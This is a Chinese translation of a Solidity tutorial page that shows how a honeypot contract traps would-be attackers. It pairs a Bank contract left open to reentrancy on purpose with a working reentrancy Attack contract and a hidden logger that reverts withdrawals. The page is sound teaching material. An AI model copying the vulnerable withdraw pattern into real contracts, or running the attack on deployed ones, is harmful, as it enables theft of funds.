# 蜜罐

对应英文原页：https://solidity-by-example.org/hacks/honeypot

蜜罐（honeypot）是用来抓捕黑客的陷阱。

## 漏洞

结合重入和隐藏恶意代码这两种漏洞，我们可以构建一个合约

来捕捉恶意用户。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
Bank 是一个调用 Logger 记录事件的合约。
Bank.withdraw() 容易受到重入攻击。
因此黑客会尝试抽干 Bank 中的 Ether。
但实际上，重入漏洞是给黑客的诱饵。
通过用 HoneyPot 代替 Logger 来部署 Bank，这个合约就变成了
黑客的陷阱。让我们看看如何做到。

1. Alice 部署 HoneyPot
2. Alice 使用 HoneyPot 的地址部署 Bank
3. Alice 向 Bank 存入 1 Ether。
4. Eve 发现 Bank.withdraw 中的重入漏洞，决定攻击它。
5. Eve 使用 Bank 的地址部署 Attack
6. Eve 调用 Attack.attack() 并发送 1 Ether，但交易失败。

发生了什么？
Eve 调用 Attack.attack()，开始从 Bank 提取 Ether。
当最后一次 Bank.withdraw() 即将完成时，它调用 logger.log()。
Logger.log() 调用 HoneyPot.log() 并回滚。交易失败。
*/

contract Bank {
    mapping(address => uint256) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint256 _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent,) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint256 amount, string action);

    function log(address _caller, uint256 _amount, string memory _action)
        public
    {
        emit Log(_caller, _amount, _action);
    }
}

// 黑客试图通过重入抽干存储在 Bank 中的 Ether。
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// 假设这段代码在一个单独的文件中，其他人无法读取它。
contract HoneyPot {
    function log(address _caller, uint256 _amount, string memory _action)
        public
    {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // 使用 keccak256 比较字符串的函数
    function equal(string memory _a, string memory _b)
        public
        pure
        returns (bool)
    {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
```

---
## 关注我们
[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)


[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
